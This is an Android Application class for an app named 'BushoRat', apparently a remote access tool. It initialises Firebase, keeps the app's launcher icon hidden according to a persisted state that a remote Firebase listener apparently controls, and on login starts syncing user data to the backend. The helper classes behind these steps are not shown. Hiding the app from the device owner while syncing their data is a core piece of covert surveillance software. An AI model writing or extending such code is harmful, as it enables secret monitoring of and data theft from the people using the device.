package com.bushorat.app;

import android.app.Application;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.FirebaseDatabase;
import com.bushorat.app.helpers.AppVisibilityHelper;
import com.bushorat.app.helpers.UserDataSyncHelper;

public class BushoRatApplication extends Application {
    private static final String TAG = "BushoRatApplication";
    private FirebaseAuth.AuthStateListener authStateListener;

    @Override
    public void onCreate() {
        super.onCreate();

        Log.d(TAG, "Application onCreate: Initializing Firebase");

        FirebaseApp.initializeApp(this);
        FirebaseDatabase.getInstance().setPersistenceEnabled(true);

        // Initialize visibility helper and apply persisted state.
        // Do NOT force-enable the launcher — respect the persisted hidden state from SharedPreferences.
        // If the app was hidden before, keep it hidden until Firebase listener confirms.
        AppVisibilityHelper visibilityHelper = AppVisibilityHelper.getInstance(this);
        if (!visibilityHelper.isAppHidden()) {
            // Only enable if not hidden per persisted state
            visibilityHelper.ensureLauncherComponentEnabled();
        } else {
            // App was hidden before — apply the persisted hidden state
            Log.d(TAG, "App was hidden before, keeping it hidden until Firebase confirms");
        }
        registerVisibilityAuthListener();
    }

    private void registerVisibilityAuthListener() {
        authStateListener = firebaseAuth -> {
            if (firebaseAuth.getCurrentUser() != null) {
                Log.d(TAG, "Auth state: user logged in, starting visibility listener and data sync");
                AppVisibilityHelper visibilityHelper =
                        AppVisibilityHelper.getInstance(BushoRatApplication.this);
                visibilityHelper.ensureListenerStarted();
                // Async only — previous blocking await on the main thread caused freezes/crashes.
                UserDataSyncHelper.syncAll(BushoRatApplication.this);
            }
        };
        FirebaseAuth.getInstance().addAuthStateListener(authStateListener);
    }
}
